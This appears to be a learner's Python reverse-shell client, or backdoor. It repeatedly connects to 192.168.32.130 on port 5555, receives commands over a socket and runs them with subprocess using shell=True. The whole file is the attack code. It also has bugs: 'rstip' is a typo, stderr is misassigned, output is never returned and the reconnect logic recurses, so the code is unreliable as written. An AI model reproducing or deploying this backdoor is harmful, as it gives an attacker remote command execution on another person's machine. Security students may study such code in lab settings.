# -*- coding: utf-8 -*-
"""
Created on Sat Sep 10 16:26:29 2022

@author: dawid
"""

import socket
import time
import json
import subprocess




def reliable_send(data):
    jsondata = json.dumps(data)
    soc.send(jsondata.encode())
    

def reliable_recv():
    data = ''
    while True:
        try:
            data = data + soc.recv(1024).decode().rstip() # we try to get 1024 bytes from our target, we add it to the previous data we received 
            return json.loads(data)
        except ValueError:
            continue



def connection():
    
  while True:
    time.sleep(20)
    
    try:
        soc.connect(('192.168.32.130', 5555))
        shell()
        soc.close()
        break
        
    except: 
        connection()
        
        

def shell():
    while True:
        command = reliable_recv()
        if command == 'quit':
            break
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess)
     
        
        

soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
